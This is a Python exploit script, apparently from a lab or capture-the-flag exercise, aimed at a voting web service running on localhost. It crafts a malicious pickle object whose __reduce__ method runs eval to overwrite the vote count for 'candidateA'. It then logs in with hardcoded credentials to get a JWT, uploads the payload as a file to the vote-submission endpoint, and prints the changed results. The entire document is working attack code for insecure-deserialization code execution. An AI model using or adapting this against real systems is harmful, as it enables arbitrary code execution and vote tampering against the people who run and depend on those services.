import pickle
import requests

class MaliciousPayload:
    def __reduce__(self):
        return (eval, ("votes.update({'candidateA': 49900})",))

# Serialize the malicious object
malicious_payload = pickle.dumps(MaliciousPayload())

login_url = "http://localhost:8080/login"
login_data = {
    "username": "123456789", 
    "password": "password"  
}
login_response = requests.post(login_url, json=login_data)

if login_response.status_code == 200:
    token = login_response.json().get("token")
    print("JWT token obtained:", token)
else:
    print("Failed to obtain JWT token:", login_response.text)
    exit()

# Send the payload to the server
url = "http://localhost:8080/vote/submit"
files = {
    "file": ("malicious.pkl", malicious_payload)
}

headers = {
    "Authorization": f"Bearer {token}"  
}

response = requests.post(url, files=files, headers=headers)
# print("Response from server:", response.text)

# Check the results
results = requests.get("http://localhost:8080/vote/results")
print("Results after exploit:", results.text)
